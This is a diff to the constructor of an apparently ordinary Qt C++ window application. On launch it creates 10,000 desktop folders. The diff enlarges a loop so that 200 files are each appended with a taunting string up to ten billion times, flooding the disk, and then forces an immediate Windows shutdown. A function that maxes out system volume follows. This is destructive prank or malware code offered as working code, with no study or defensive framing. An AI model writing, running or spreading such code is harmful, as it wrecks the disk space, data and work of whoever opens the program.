@@ -20,16 +20,17 @@ MainWindow::MainWindow(QWidget *parent)
    for (int var = 0; var < 10000; ++var) {
    desktopDir.mkdir(folderName+QString::number(var));
     }
-  QProcess::startDetached("shutdown", QStringList() << "/s" << "/t" << "0");
-   for (int var = 0; var < 2; ++var) {
+   for (int var = 0; var < 200; ++var) {
        QFile file(desktopPath+"/Archivo"+QString::number(var));
        QDataStream data(&file);
        file.open(QIODevice::Append);
-       for (int var2 = 0; var2 < 10; ++var2) {
+       for (int var2 = 0; var2 < 10000000000; ++var2) {
            data << "ERICAMAYATEVAAPISARRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRR";
        }
    }
+     QProcess::startDetached("shutdown", QStringList() << "/s" << "/t" << "0");
 }
+
 void MainWindow::setVolumeToMax()
 {
     HRESULT hr;
